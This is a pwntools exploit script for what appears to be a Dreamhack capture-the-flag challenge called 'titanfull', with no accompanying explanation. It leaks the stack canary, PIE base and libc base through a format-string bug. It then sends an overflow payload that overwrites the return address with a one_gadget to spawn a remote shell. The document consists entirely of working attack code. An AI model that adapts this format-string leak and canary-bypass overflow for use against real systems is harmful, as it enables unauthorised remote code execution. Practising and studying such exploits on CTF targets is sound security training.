from pwn import *

r = remote("host3.dreamhack.games", 24237)
e = ELF("./titanfull")
libc = ELF("./libc-2.31.so")
#r = process("./titanfull")

# rsi(1) rdx(2) rcx(3) r8(4) r9(5) rsp(6)... rsp+0x58(17) rsp+0x78(21)

r.sendafter(b"pilot? > ", b"%17$p %19$p %21$p")
r.recvuntil(b"hello, ")
#gdb.attach(r)
canary = int(r.recvn(18), 16)
PIE_base = int(r.recvn(15), 16) - (e.symbols["main"] + 28)
libc_base = int(r.recvn(15)[1:], 16) - 0xF3 - libc.symbols["__libc_start_main"]
system = libc_base + 0x52290
binsh = libc_base + next(libc.search(b"/bin/sh"))
pop_rdi = libc_base + 0x23b6a
og = libc_base + 0xe3b01
print(hex(canary), hex(PIE_base), hex(libc_base))
r.sendlineafter(b"> ", b"7274")
payload = b"A"*24 + p64(canary) + b"B"*8 + p64(og)
r.sendlineafter(b" : ", payload)
r.interactive()